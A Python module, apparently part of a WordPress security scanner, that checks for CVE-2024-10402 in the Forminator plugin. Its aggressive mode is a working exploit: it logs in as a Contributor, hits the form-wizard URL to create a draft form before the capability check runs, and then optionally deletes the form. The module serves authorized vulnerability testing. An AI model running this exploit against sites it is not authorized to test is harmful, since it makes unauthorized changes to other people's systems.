from __future__ import annotations

import re
import secrets
from typing import Any
from urllib.parse import quote

from ...core.args import aggressive_value
from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from .forminator_advisory import COMPONENT, blocked_finding, passive_result

CVE_ID = "CVE-2024-10402"
NAME = "Forminator authenticated contributor form creation/update authorization bypass"
AFFECTED_RULE = "Forminator <=1.35.1; fixed in 1.36.0"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
LOGIN_PATH = "/wp-login.php"
WIZARD_PATH = "/wp-admin/admin.php?page=forminator-cform-wizard&template=blank&name={marker}"
FORM_LIST_PATH = "/wp-admin/admin.php?page=forminator-cform"
NONCE_RE = re.compile(r'name="forminatorNonce"[^>]*value="([^"]+)"')
FORM_ID_RE = re.compile(r"[?&]id=(\d+)")


def classify_version(version: str | None) -> str:
    from .forminator_advisory import classify_version as classify

    return classify(version, fixed="1.36.0")


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    return blocked_finding(cve=CVE_ID, name=NAME, affected_rule=AFFECTED_RULE, detail="The advisory requires an authenticated Contributor-level session and a form create/update request. No credentialed session was supplied, so the safe probe sent no state-changing request.", action="Upgrade Forminator to 1.36.0 or newer; if an authorized staging account is available, test capability enforcement there.")


def _login(client: HttpClient, base: str, username: str, password: str, timeout: int) -> bool:
    client.get(f"{base}{LOGIN_PATH}", timeout=timeout)
    response = client.request(
        f"{base}{LOGIN_PATH}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode({
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": f"{base}/wp-admin/",
            "testcookie": "1",
        }),
        timeout=timeout,
        follow_redirects=False,
    )
    location = str((response.get("headers") or {}).get("Location") or "")
    return response.get("status") in (301, 302, 303) and "wp-login.php" not in location


def _delete_form(client: HttpClient, base: str, form_id: int, marker: str, timeout: int) -> bool:
    page = client.get(f"{base}{FORM_LIST_PATH}", timeout=timeout)
    if page.get("status") != 200:
        return False
    match = NONCE_RE.search(page.get("body") or "")
    if not match:
        return False
    client.request(
        f"{base}{FORM_LIST_PATH}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode({
            "forminator_action": "delete-forms",
            "ids": str(form_id),
            "id": str(form_id),
            "forminatorNonce": match.group(1),
        }),
        timeout=timeout,
        follow_redirects=False,
    )
    after = client.get(f"{base}{FORM_LIST_PATH}", timeout=timeout)
    return marker not in (after.get("body") or "")


def run_aggressive_probe(
    target_url: str,
    username: str | None = None,
    password: str | None = None,
    admin_user: str | None = None,
    admin_password: str | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Create a draft form as a Contributor and verify the missing authorization.

    The Contributor only needs to reach ``admin.php`` (all roles with ``read``
    can); the wizard page itself returns 403, but ``create_module()`` runs on
    ``wp_loaded`` before the page capability check and redirects to the new
    form id. Cleanup uses the optional administrator credentials to delete the
    draft through the Forminator bulk action; without them the form id is
    reported for manual removal.
    """
    base = normalize_url(target_url)
    if not username or not password:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="BLOCKED_EXTERNAL",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=False,
            proof_url=f"{base}{LOGIN_PATH}",
            detail=(
                "The aggressive proof needs a Contributor-level session. Pass "
                "--aggressive-arg username=... password=... (and optionally "
                "admin_user/admin_password for cleanup). Nothing was sent."
            ),
            action="Re-run with lab credentials on an authorized staging site.",
        )

    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}/", detail=f"The target could not be reached ({transport_error_detail(preflight)}).", action="Retry when the target is reachable.")

    if not _login(client, base, username, password, timeout):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{LOGIN_PATH}", detail="The Contributor login did not establish a session; the form-creation request was not sent.", action="Verify the lab credentials and the WordPress login route.")

    marker = f"proofcms-10402-{secrets.token_hex(6)}"
    proof_url = f"{base}{WIZARD_PATH.format(marker=quote(marker, safe=''))}"
    response = client.request(proof_url, method="GET", timeout=timeout, follow_redirects=False)
    location = str((response.get("headers") or {}).get("Location") or "")
    match = FORM_ID_RE.search(location)
    created_id = int(match.group(1)) if match else None
    evidence: dict[str, Any] = {
        "logged_in": True,
        "marker": marker,
        "status": response.get("status"),
        "location": location or None,
        "created_form_id": created_id,
        "cleanup_attempted": False,
        "cleanup_verified": False,
    }

    if created_id:
        if admin_user and admin_password:
            admin = HttpClient(timeout=timeout, proxy=proxy)
            if _login(admin, base, admin_user, admin_password, timeout):
                evidence["cleanup_attempted"] = True
                evidence["cleanup_verified"] = _delete_form(admin, base, created_id, marker, timeout)
        cleanup_note = (
            " The draft form was deleted through the Forminator bulk action."
            if evidence["cleanup_verified"]
            else f" Remove draft form {created_id} manually or re-run with admin_user/admin_password for cleanup."
        )
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=proof_url,
            evidence=evidence,
            cleanup_attempted=bool(evidence["cleanup_attempted"]),
            cleanup_verified=bool(evidence["cleanup_verified"]),
            detail=(
                f"A Contributor session created Forminator form {created_id} (marker {marker!r}) through the "
                "wizard URL. The page returned "
                f"HTTP {response.get('status')}, but create_module() ran on wp_loaded before the capability "
                "check and issued the redirect to the new form."
                f"{cleanup_note}"
            ),
            action="Upgrade Forminator to 1.36.0 or newer and audit draft forms created by low-privilege users.",
        )

    detail = (
        f"The wizard request returned HTTP {response.get('status')} without a redirect to a new form id. "
        "This is consistent with the 1.36.0 create_nonce gate."
    )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=proof_url,
        evidence=evidence,
        detail=detail,
        action="If Forminator is at or below 1.35.1, verify the wizard request manually on an authorized target.",
    )


def check(target_url: str, cms_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    passive = passive_result(cve=CVE_ID, name=NAME, affected_rule=AFFECTED_RULE, plugins=plugins, fixed="1.36.0", remediation="Upgrade Forminator to 1.36.0 or newer.")
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because Forminator was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(
            target_url,
            username=aggressive_value(aggressive_args, aggressive_command, "username"),
            password=aggressive_value(aggressive_args, aggressive_command, "password"),
            admin_user=aggressive_value(aggressive_args, aggressive_command, "admin_user"),
            admin_password=aggressive_value(aggressive_args, aggressive_command, "admin_password"),
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (advisory) and aggressive (Contributor form creation) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "wordpress", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_versions": ["<=1.35.1"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "module_version": "2.0.0", "last_reviewed": "2026-11-14", "updated": "2026-11-14", "required_detectors": ["detect_wordpress_plugins"], "references": ["https://www.cve.org/CVERecord?id=CVE-2024-10402", "https://plugins.trac.wordpress.org/changeset/3169243/", "https://www.wordfence.com/threat-intel/vulnerabilities/id/be1d9d2b-cbdf-4d62-85fe-2616eaf02848"]}
